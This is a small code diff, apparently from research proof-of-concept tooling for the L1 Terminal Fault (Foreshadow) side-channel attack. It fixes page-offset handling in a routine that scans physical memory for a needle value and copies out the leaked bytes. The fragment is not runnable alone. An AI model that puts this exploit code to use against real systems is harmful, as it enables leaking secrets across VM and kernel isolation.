@@ -177,6 +177,7 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size,
   assert(needle_size > 0);
   assert(needle_size < scan_opts.stride);
   assert(needle_size % 4 == 0);
+  assert(scan_opts.start + needle_size < PAGE_SIZE);
 
   reload_buffer_t nibble_reload_buffer = {0};
   size_t attempt = 1;
@@ -190,7 +191,7 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size,
       l1tf_leak_buffer_modify(&leak, (void *)ptr);
 
       for (size_t idx = 0; idx < needle_size; idx += 4) {
-        uint8_t *leak_ptr = (uint8_t *)leak.leak + idx;
+        uint8_t *leak_ptr = &((uint8_t *)leak.leak)[idx + (ptr & 0xfff)];
         if (l1tf_check_4(leak_ptr, reload_buffer, (uint8_t *)needle)) {
           uint8_t leaked_data[32] = {0};
           for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
